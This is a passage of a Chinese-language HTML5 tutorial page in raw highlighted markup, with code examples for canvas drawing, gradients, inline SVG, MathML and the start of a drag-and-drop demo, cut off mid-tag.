class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><br><span class="handlebars"><span class="xml">var c=document.getElementById(&quot;myCanvas&quot;); <span class="hljs-comment">&lt;!--第一步--&gt;</span></span></span><br><span class="handlebars"><span class="xml">var ctx=c.getContext(&quot;2d&quot;); <span class="hljs-comment">&lt;!--第二步--&gt;</span></span></span><br><span class="handlebars"><span class="xml">ctx.fillStyle=&quot;#FF0000&quot;; <span class="hljs-comment">&lt;!--第三步--&gt;</span></span></span><br><span class="handlebars"><span class="xml">ctx.fillRect(0,0,150,75); <span class="hljs-comment">&lt;!--第四步--&gt;</span></span></span><br><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span> <br></code></pre></div></td></tr></table></figure><p><strong>代码解析</strong></p><blockquote><p>1.第一步为找到canvas元素。</p></blockquote><blockquote><p>2.第二步创建context对象。<br>getContext(“2d”) 对象是内建的 HTML5 对象，拥有多种绘制路径、矩形、圆形、字符以及添加图像的方法。</p></blockquote><blockquote><p>3.第三步和第四步是绘制一个红色的矩形。<br>设置fillStyle属性可以是CSS颜色，渐变，或图案。fillStyle默认设置是#000000（黑色）。<br>fillRect(x,y,width,height) 方法定义了矩形当前的填充方式。 </p></blockquote><h3 id="1-3-canvas坐标"><a href="#1-3-canvas坐标" class="headerlink" title="1.3 canvas坐标"></a>1.3 canvas坐标</h3><p>canvas 是一个二维网格。canvas 的左上角坐标为 (0,0)。<br>上面1.2中的 fillRect 方法拥有参数 (0,0,150,75)。意思是：在画布上绘制 150x75 的矩形，从左上角开始 (0,0)。</p><h3 id="1-4-canvas路径"><a href="#1-4-canvas路径" class="headerlink" title="1.4 canvas路径"></a>1.4 canvas路径</h3><p>在Canvas上画线，我们将使用以下两种方法：</p><blockquote><ul><li>moveTo(x,y) 定义线条开始坐标。</li></ul></blockquote><blockquote><ul><li>lineTo(x,y) 定义线条结束坐标。</li></ul></blockquote><p>绘制线条我们必须使用到 “ink” 的方法，就像stroke()。</p><p>使用实例：定义开始坐标(0,0), 和结束坐标 (200,100). 然后使用 stroke() 方法来绘制线条。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">var c=document.getElementById(&quot;myCanvas&quot;);<br>var ctx=c.getContext(&quot;2d&quot;);<br>ctx.moveTo(0,0);<br>ctx.lineTo(200,100);<br>ctx.stroke();<br></code></pre></div></td></tr></table></figure><p>在canvas中绘制圆形，可以这样用：</p><ul><li>arc(x,y,r,start,stop)</li></ul><p>实际上我们在绘制圆形时使用了 “ink” 的方法, 比如 stroke() 或者 fill()。</p><p>使用实例：使用 arc() 方法 绘制一个圆.var c=document.getElementById(“myCanvas”);<br>var ctx=c.getContext(“2d”);<br>ctx.beginPath();<br>ctx.arc(95,50,40,0,2*Math.PI);<br>ctx.stroke();</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">var c=document.getElementById(&quot;myCanvas&quot;);<br>var ctx=c.getContext(&quot;2d&quot;);<br>ctx.beginPath();<br>ctx.arc(95,50,40,0,2*Math.PI);<br>ctx.stroke();<br></code></pre></div></td></tr></table></figure><h3 id="1-5-canvas文本"><a href="#1-5-canvas文本" class="headerlink" title="1.5 canvas文本"></a>1.5 canvas文本</h3><p>使用 canvas 绘制文本，重要的属性和方法如下：</p><blockquote><ul><li>font：定义字体</li><li>fillText(text,x,y) ：在 canvas 上绘制实心的文本</li><li>strokeText(text,x,y)：在 canvas 上绘制空心的文本</li></ul></blockquote><h4 id="1-5-1-使用fillText"><a href="#1-5-1-使用fillText" class="headerlink" title="1.5.1 使用fillText()"></a>1.5.1 使用fillText()</h4><p>使用实例：使用 “Arial” 字体在画布上绘制一个高 30px 的文字（实心）：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">var c=document.getElementById(&quot;myCanvas&quot;);<br>var ctx=c.getContext(&quot;2d&quot;);<br>ctx.font=&quot;30px Arial&quot;;<br>ctx.fillText(&quot;Hello World&quot;,10,50);<br></code></pre></div></td></tr></table></figure><h4 id="1-5-2-使用strokeText"><a href="#1-5-2-使用strokeText" class="headerlink" title="1.5.2 使用strokeText()"></a>1.5.2 使用strokeText()</h4><p>使用实例：使用 “Arial” 字体在画布上绘制一个高 30px 的文字（空心）：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">var c=document.getElementById(&quot;myCanvas&quot;);<br>var ctx=c.getContext(&quot;2d&quot;);<br>ctx.font=&quot;30px Arial&quot;;<br>ctx.strokeText(&quot;Hello World&quot;,10,50);<br></code></pre></div></td></tr></table></figure><h3 id="1-6-canvas渐变"><a href="#1-6-canvas渐变" class="headerlink" title="1.6 canvas渐变"></a>1.6 canvas渐变</h3><p>渐变可以填充在矩形, 圆形, 线条, 文本等等, 各种形状可以自己定义不同的颜色。<br>有两种不同的方式来设置Canvas渐变：</p><blockquote><ul><li>createLinearGradient(x,y,x1,y1) ： 创建线条渐变</li><li>createRadialGradient(x,y,r,x1,y1,r1) ： 创建一个径向/圆渐变</li></ul></blockquote><p>当我们使用渐变对象，必须使用两种或两种以上的停止颜色。addColorStop()方法指定颜色停止，参数使用坐标来描述，可以是0至1。<br>使用渐变，设置fillStyle或strokeStyle的值为渐变，然后绘制形状，如矩形，文本，或一条线。</p><h4 id="1-6-1-使用-createLinearGradient"><a href="#1-6-1-使用-createLinearGradient" class="headerlink" title="1.6.1 使用 createLinearGradient()"></a>1.6.1 使用 createLinearGradient()</h4><p>使用实例：创建一个线性渐变。使用渐变填充矩形:</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">var c=document.getElementById(&quot;myCanvas&quot;);<br>var ctx=c.getContext(&quot;2d&quot;);<br><br>// Create gradient<br>var grd=ctx.createLinearGradient(0,0,200,0);<br>grd.addColorStop(0,&quot;red&quot;);<br>grd.addColorStop(1,&quot;white&quot;);<br><br>// Fill with gradient<br>ctx.fillStyle=grd;<br>ctx.fillRect(10,10,150,80);<br></code></pre></div></td></tr></table></figure><h4 id="1-6-2-使用-createRadialGradient"><a href="#1-6-2-使用-createRadialGradient" class="headerlink" title="1.6.2 使用 createRadialGradient()"></a>1.6.2 使用 createRadialGradient()</h4><p>使用实例：创建一个径向/圆渐变。使用渐变填充矩形：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">var c=document.getElementById(&quot;myCanvas&quot;);<br>var ctx=c.getContext(&quot;2d&quot;);<br><br>// Create gradient<br>var grd=ctx.createRadialGradient(75,50,5,90,60,100);<br>grd.addColorStop(0,&quot;red&quot;);<br>grd.addColorStop(1,&quot;white&quot;);<br><br>// Fill with gradient<br>ctx.fillStyle=grd;<br>ctx.fillRect(10,10,150,80);<br></code></pre></div></td></tr></table></figure><p><strong>注意：</strong>当使用&lt;canvas&gt;元素创建径向渐变的时候 context.createRadialGradient(x , y , r , x1 , y1 , r1) 括号内的参数有如下的含义:</p><blockquote><ul><li> x：表示渐变的开始圆的 x 坐标</li><li> y：表示渐变的开始圆的 y 坐标</li><li> r：表示开始圆的半径</li><li> x1：表示渐变的结束圆的 x 坐标</li><li>  y1：表示渐变的结束圆的 y 坐标</li><li> r1：表示结束圆的半径</li></ul></blockquote><h3 id="1-7-canvas图像"><a href="#1-7-canvas图像" class="headerlink" title="1.7 canvas图像"></a>1.7 canvas图像</h3><p>把一幅图像放置到画布上, 使用方法drawImage(image,x,y)。<br>使用实例：把一幅图像放置到画布上:</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">var c=document.getElementById(&quot;myCanvas&quot;);<br>var ctx=c.getContext(&quot;2d&quot;);<br>var img=document.getElementById(&quot;scream&quot;);<br>ctx.drawImage(img,10,10);<br></code></pre></div></td></tr></table></figure><h2 id="2-内联SVG"><a href="#2-内联SVG" class="headerlink" title="2.内联SVG"></a>2.内联SVG</h2><p>SVG表示可缩放矢量图形，是基于可扩展标记语言（标准通用标记语言的子集），用于描述二维矢量图形的一种图形格式，它在2003年1月14日成为W3C推荐标准。</p><h3 id="2-1-什么是SVG"><a href="#2-1-什么是SVG" class="headerlink" title="2.1 什么是SVG"></a>2.1 什么是SVG</h3><p>SVG 指可伸缩矢量图形 (Scalable Vector Graphics)， 用于定义用于网络的基于矢量的图形， 使用 XML 格式定义图形， 图像在放大或改变尺寸的情况下其图形质量不会有损失， 是万维网联盟的标准，SVG 与 DOM 和 XSL 之类的 W3C 标准是一个整体。</p><h3 id="2-2-SVG优势"><a href="#2-2-SVG优势" class="headerlink" title="2.2 SVG优势"></a>2.2 SVG优势</h3><p>与其他图像格式相比（比如 JPEG 和 GIF），使用 SVG 的优势在于：</p><ul><li>SVG 图像可通过文本编辑器来创建和修改</li><li>SVG 图像可被搜索、索引、脚本化或压缩</li><li>SVG 是可伸缩的</li><li>SVG 图像可在任何的分辨率下被高质量地打印</li><li>SVG 可在图像质量不下降的情况下被放大</li></ul><h3 id="2-3-SVG直接嵌入HTML页面"><a href="#2-3-SVG直接嵌入HTML页面" class="headerlink" title="2.3 SVG直接嵌入HTML页面"></a>2.3 SVG直接嵌入HTML页面</h3><p>在 HTML5 中，能够将 SVG 元素直接嵌入 HTML 页面中：</p><p>使用实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;https://tothefor.com/&quot;</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;1.1&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;190&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">polygon</span> <span class="hljs-attr">points</span>=<span class="hljs-string">&quot;100,10 40,180 190,60 10,60 160,180&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;fill:lime;stroke:purple;stroke-width:5;fill-rule:evenodd;&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="2-4-SVG与canvas的区别"><a href="#2-4-SVG与canvas的区别" class="headerlink" title="2.4 SVG与canvas的区别"></a>2.4 SVG与canvas的区别</h3><p>SVG 是一种使用 XML 描述 2D 图形的语言。</p><p>Canvas 通过 JavaScript 来绘制 2D 图形。</p><p>SVG 基于 XML，这意味着 SVG DOM 中的每个元素都是可用的。您可以为某个元素附加 JavaScript 事件处理器。</p><p>在 SVG 中，每个被绘制的图形均被视为对象。如果 SVG 对象的属性发生变化，那么浏览器能够自动重现图形。</p><p>Canvas 是逐像素进行渲染的。在 canvas 中，一旦图形被绘制完成，它就不会继续得到浏览器的关注。如果其位置发生变化，那么整个场景也需要重新绘制，包括任何或许已被图形覆盖的对象。</p><p><strong>两者的比较</strong></p><p><strong>Canvas</strong></p><ul><li>依赖分辨率</li><li>不支持事件处理器</li><li>弱的文本渲染能力</li><li>能够以 .png 或 .jpg 格式保存结果图像</li><li>最适合图像密集型的游戏，其中的许多对象会被频繁重绘</li></ul><p><strong>SVG</strong></p><ul><li>不依赖分辨率</li><li>支持事件处理器</li><li>最适合带有大型渲染区域的应用程序（比如谷歌地图）</li><li>复杂度高会减慢渲染速度（任何过度使用 DOM 的应用都不快）</li><li>不适合游戏应用</li></ul><h2 id="3-MathML"><a href="#3-MathML" class="headerlink" title="3.MathML"></a>3.MathML</h2><p>MathML 是数学标记语言，是一种基于XML（标准通用标记语言的子集）的标准，用来在互联网上书写数学符号和公式的置标语言。</p><p>MathML 与 HTML相似度很高，但是比较繁琐。它继承了角括号和双标签（&lt;标签&gt;内容&lt;/标签&gt;）的用法。<br>HTML5 可以在文档中使用 MathML 元素，对应的标签是 &lt;math&gt;…&lt;/math&gt; 。</p><p>使用实例1：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>W3Cschool在线教程(w3cschool.cn)<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">math</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span><br>         <span class="hljs-tag">&lt;<span class="hljs-name">mrow</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">msup</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">mi</span>&gt;</span>a<span class="hljs-tag">&lt;/<span class="hljs-name">mi</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">mn</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">mn</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">msup</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">mo</span>&gt;</span>+<span class="hljs-tag">&lt;/<span class="hljs-name">mo</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">msup</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">mi</span>&gt;</span>b<span class="hljs-tag">&lt;/<span class="hljs-name">mi</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">mn</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">mn</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">msup</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">mo</span>&gt;</span>=<span class="hljs-tag">&lt;/<span class="hljs-name">mo</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">msup</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">mi</span>&gt;</span>c<span class="hljs-tag">&lt;/<span class="hljs-name">mi</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">mn</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">mn</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">msup</span>&gt;</span><br>         <span class="hljs-tag">&lt;/<span class="hljs-name">mrow</span>&gt;</span><br><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">math</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>运行结果：<br>a<sup>2</sup>+b<sup>2</sup>=c<sup>2</sup></p><p>使用实例2：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>W3Cschool在线教程(w3cschool.cn)<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">math</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span><br>         <span class="hljs-tag">&lt;<span class="hljs-name">mrow</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">mrow</span>&gt;</span><br>               <span class="hljs-tag">&lt;<span class="hljs-name">msup</span>&gt;</span><br>                  <span class="hljs-tag">&lt;<span class="hljs-name">mi</span>&gt;</span>x<span class="hljs-tag">&lt;/<span class="hljs-name">mi</span>&gt;</span><br>                  <span class="hljs-tag">&lt;<span class="hljs-name">mn</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">mn</span>&gt;</span><br>               <span class="hljs-tag">&lt;/<span class="hljs-name">msup</span>&gt;</span><br>               <span class="hljs-tag">&lt;<span class="hljs-name">mo</span>&gt;</span>+<span class="hljs-tag">&lt;/<span class="hljs-name">mo</span>&gt;</span><br>               <span class="hljs-tag">&lt;<span class="hljs-name">mrow</span>&gt;</span><br>                  <span class="hljs-tag">&lt;<span class="hljs-name">mn</span>&gt;</span>4<span class="hljs-tag">&lt;/<span class="hljs-name">mn</span>&gt;</span><br>                  <span class="hljs-tag">&lt;<span class="hljs-name">mo</span>&gt;</span>⁢<span class="hljs-tag">&lt;/<span class="hljs-name">mo</span>&gt;</span><br>                  <span class="hljs-tag">&lt;<span class="hljs-name">mi</span>&gt;</span>x<span class="hljs-tag">&lt;/<span class="hljs-name">mi</span>&gt;</span><br>               <span class="hljs-tag">&lt;/<span class="hljs-name">mrow</span>&gt;</span><br>               <span class="hljs-tag">&lt;<span class="hljs-name">mo</span>&gt;</span>+<span class="hljs-tag">&lt;/<span class="hljs-name">mo</span>&gt;</span><br>               <span class="hljs-tag">&lt;<span class="hljs-name">mn</span>&gt;</span>4<span class="hljs-tag">&lt;/<span class="hljs-name">mn</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">mrow</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">mo</span>&gt;</span>=<span class="hljs-tag">&lt;/<span class="hljs-name">mo</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">mn</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">mn</span>&gt;</span><br>         <span class="hljs-tag">&lt;/<span class="hljs-name">mrow</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">math</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>运行结果：<br>x<sup>2</sup>+4x+4=0</p><p>使用实例3：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>W3Cschool在线教程(w3cschool.cn)<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">math</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span><br>         <span class="hljs-tag">&lt;<span class="hljs-name">mrow</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">mi</span>&gt;</span>A<span class="hljs-tag">&lt;/<span class="hljs-name">mi</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">mo</span>&gt;</span>=<span class="hljs-tag">&lt;/<span class="hljs-name">mo</span>&gt;</span><br><br>            <span class="hljs-tag">&lt;<span class="hljs-name">mfenced</span> <span class="hljs-attr">open</span>=<span class="hljs-string">&quot;[&quot;</span> <span class="hljs-attr">close</span>=<span class="hljs-string">&quot;]&quot;</span>&gt;</span><br><br>               <span class="hljs-tag">&lt;<span class="hljs-name">mtable</span>&gt;</span><br>                  <span class="hljs-tag">&lt;<span class="hljs-name">mtr</span>&gt;</span><br>                     <span class="hljs-tag">&lt;<span class="hljs-name">mtd</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">mi</span>&gt;</span>x<span class="hljs-tag">&lt;/<span class="hljs-name">mi</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">mtd</span>&gt;</span><br>                     <span class="hljs-tag">&lt;<span class="hljs-name">mtd</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">mi</span>&gt;</span>y<span class="hljs-tag">&lt;/<span class="hljs-name">mi</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">mtd</span>&gt;</span><br>                  <span class="hljs-tag">&lt;/<span class="hljs-name">mtr</span>&gt;</span><br><br>                  <span class="hljs-tag">&lt;<span class="hljs-name">mtr</span>&gt;</span><br>                     <span class="hljs-tag">&lt;<span class="hljs-name">mtd</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">mi</span>&gt;</span>z<span class="hljs-tag">&lt;/<span class="hljs-name">mi</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">mtd</span>&gt;</span><br>                     <span class="hljs-tag">&lt;<span class="hljs-name">mtd</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">mi</span>&gt;</span>w<span class="hljs-tag">&lt;/<span class="hljs-name">mi</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">mtd</span>&gt;</span><br>                  <span class="hljs-tag">&lt;/<span class="hljs-name">mtr</span>&gt;</span><br>               <span class="hljs-tag">&lt;/<span class="hljs-name">mtable</span>&gt;</span><br>               <br>            <span class="hljs-tag">&lt;/<span class="hljs-name">mfenced</span>&gt;</span><br>         <span class="hljs-tag">&lt;/<span class="hljs-name">mrow</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">math</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>实例是一个 2×2 矩阵，可以在 Firefox 3.5 以上版本查看到效果。</p><h2 id="4-拖放（Drag和Drop）"><a href="#4-拖放（Drag和Drop）" class="headerlink" title="4.拖放（Drag和Drop）"></a>4.拖放（Drag和Drop）</h2><p>拖放的目的是可以让你将某个对象放置到你想要放置的位置。拖放（Drag 和 drop）是 HTML5 标准的组成部分。</p><p>拖放是一种常见的特性，即抓取对象以后拖到另一个位置。在 HTML5 中，拖放是标准的一部分，任何元素都能够拖放。</p><p>使用实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">HTML</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><br><span class="javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">allowDrop</span>(<span class="hljs-params">ev</span>)</span>&#123;</span><br>ev.preventDefault();<br>&#125;<br><span class="javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">drag</span>(<span class="hljs-params">ev</span>)</span>&#123;</span><br><span class="javascript">ev.dataTransfer.setData(<span class="hljs-string">&quot;Text&quot;</span>,ev.target.id);</span><br>&#125;<br><span class="javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">drop</span>(<span class="hljs-params">ev</span>)</span>&#123;</span><br>ev.preventDefault();<br><span class="javascript"><span class="hljs-keyword">var</span> data=ev.dataTransfer.getData(<span class="hljs-string">&quot;Text&quot;</span>);</span><br><span class="javascript">ev.target.appendChild(<span class="hljs-built_in">document</span>.getElementById(data));</span><br>&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;div1&quot;</span> <span class="hljs-attr">ondrop</span>=<span class="hljs-string">&quot;drop(event)&quot;</span></span><br><span class="hljs-tag"><span class="hljs-attr">ondragover</span>=<span class="hljs-string">&quot;allowDrop(event)&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span 